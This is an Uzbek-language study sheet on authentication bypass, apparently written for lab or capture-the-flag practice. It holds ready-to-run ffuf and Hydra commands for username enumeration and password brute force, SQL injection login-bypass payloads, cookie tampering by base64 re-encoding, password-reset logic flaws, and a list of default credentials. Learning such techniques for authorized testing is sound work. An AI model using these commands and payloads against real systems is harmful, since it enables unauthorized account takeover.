# 🔐 Authentication Bypass (Autentifikatsiyani Chetlab O'tish)

> **Maqsad:** Login tizimidagi zaifliklardan foydalanib, parol bilmasdan tizimga kirish.

---

## 📖 Asosiy Tushunchalar

### Autentifikatsiya (Authentication) nima?
Foydalanuvchining kim ekanligini tekshirish jarayoni. Odatda: **login + parol**.

### Nima uchun zaif bo'lishi mumkin?
- Dasturchi xato qilgan
- Mantiqiy kamchilik (logic flaw — mantiq xatosi)
- SQL injeksiya
- Standart parollar o'zgartirilmagan
- Cookie yoki token noto'g'ri tekshirilgan

---

## 🧠 1. Username Enumeration (Foydalanuvchi Nomlarini Aniqlash)

Login formasi turli xato xabarlar bersa, bu orqali kim bor-yo'qligini aniqlash mumkin.

**Misol:**
- `"Username does not exist"` → foydalanuvchi yo'q
- `"Incorrect password"` → foydalanuvchi BOR, faqat parol xato

```bash
# Ffuf bilan username enumeration
ffuf -u http://target.com/login \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=wrongpassword" \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -mr "username already exists"   # Muvaffaqiyatli javob matni

# -mr = match regex (shu matn bo'lsa hisobla)
# -fr = filter regex (shu matn bo'lsa hisoblaма)
```

---

## 💉 2. SQL Injection Login Bypass (SQL Injeksiya bilan Kirish)

Agar login formasidagi ma'lumotlar to'g'ridan-to'g'ri SQL so'roviga qo'shilsa, bu zaiflik paydo bo'ladi.

**Asl SQL so'rov:**
```sql
SELECT * FROM users WHERE username='admin' AND password='12345';
```

**Hujum — username maydoniga yoziladi:**
```
' OR 1=1 -- -
' OR '1'='1
admin'--
' OR 1=1#
```

**Natijada SQL so'rov:**
```sql
SELECT * FROM users WHERE username='' OR 1=1 -- -' AND password='anything';
-- `-- -` dan keyingi hamma narsa izoh (comment) bo'lib qoladi
-- OR 1=1 har doim TRUE → tizimga kirish
```

**Tez-tez ishlatiladigan payloadlar:**
```
' OR 1=1 -- -
' OR 1=1#
' OR '1'='1' -- -
admin'-- -
' OR 'x'='x
1' OR '1'='1
```

---

## 🍪 3. Cookie Tamper (Cookie ni Tahrirlash)

Cookie — brauzer serverdan olgan va har so'rovda qayta yuboriladigan ma'lumot.

**Agar cookie qiymati oddiy bo'lsa:**
```
Cookie: logged_in=false; admin=false
```
→ Uni `logged_in=true; admin=true` ga o'zgartirish!

**Base64 kodinglangan cookie:**
```bash
# Decode qilish
echo "dXNlcm5hbWU9Z3Vlc3Q=" | base64 -d
# Natija: username=guest

# O'zgartirish va encode qilish
echo "username=admin" | base64
# Natija: dXNlcm5hbWU9YWRtaW4=
```

**Brauzerda cookie o'zgartirish:**
```
F12 → Application → Cookies → Qiymatni o'zgartir
```

---

## 🔢 4. Brute Force (Ko'r-ko'rona Urinish)

Ko'p marta parol urinib ko'rish. Rate limiting (urinishlar sonini cheklash) bo'lmasa ishlaydi.

```bash
# Hydra bilan HTTP POST brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -V -t 10

# Parametrlar:
# -l = foydalanuvchi nomi (aniq)
# -L = foydalanuvchi nomlari ro'yxati (fayl)
# -p = parol (aniq)
# -P = parollar ro'yxati (fayl)
# "URL:POST data:Xato xabari"

# Ffuf bilan brute force
ffuf -u http://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid credentials"
```

---

## 🔄 5. Logic Flaws (Mantiq Xatolari)

Dastur mантiq jihatdan noto'g'ri yozilgan. Masalan:

**Parol tiklash zaiflik misoli:**
```
# Normal oqim:
1. Email kiriting → 2. Kod yuboriladi → 3. Parolni o'zgartiring

# Zaiflik: 3-qadamga to'g'ridan-to'g'ri o'tish mumkin bo'lsa
POST /reset-password?token=anything
{username: admin, new_password: hacker123}
```

**Ruxsatni chetlab o'tish:**
```
# Admin sahifaga to'g'ridan-to'g'ri kirish
http://target.com/admin/dashboard
# (Server faqat qo'shimcha sahifalarda tekshirsa)
```

---

## 🎯 Amaliy Misol: To'liq Login Tekshirish

```bash
# 1-qadam: Username enumeration
ffuf -u http://10.10.x.x/login \
  -X POST \
  -d "username=FUZZ&password=test" \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mr "username already exists"

# Topildi: admin, john

# 2-qadam: Parol brute force
ffuf -u http://10.10.x.x/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid credentials" \
  -fc 200    # 200 bo'lsa ham filtirla agar xato xabar bo'lsa

# 3-qadam: SQL injection urinish
# Burp Suite yoki brauzer orqali:
username: admin' -- -
password: anything

# 4-qadam: Cookie tekshirish
# F12 → Application → Cookies
# logged_in=false → true ga o'zgartir
```

---

## 🛡️ Standart Parollar

Agar hech narsa ishlamasa, standart parollarni sinab ko'ring:

```
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
guest:guest
user:password
```

---

## 💡 Eslab Qolish Uchun

| Hujum | Nishon | Vosita |
|-------|--------|--------|
| Username Enum | Xato xabarlar | ffuf |
| SQL Injection | SQL so'rovga qo'shilgan input | Qo'lda / sqlmap |
| Cookie Tamper | Zaif cookie qiymati | Brauzer DevTools |
| Brute Force | Parol cheklovsiz | Hydra / ffuf |
| Logic Flaw | Dastur mantiqi | Qo'lda tekshirish |

- `' OR 1=1 -- -` → klassik SQL bypass
- Base64 `dXNlcm5hbWU9YWRtaW4=` = `username=admin`
- Hydra: `/login:user=^USER^&pass=^PASS^:Xato xabar`
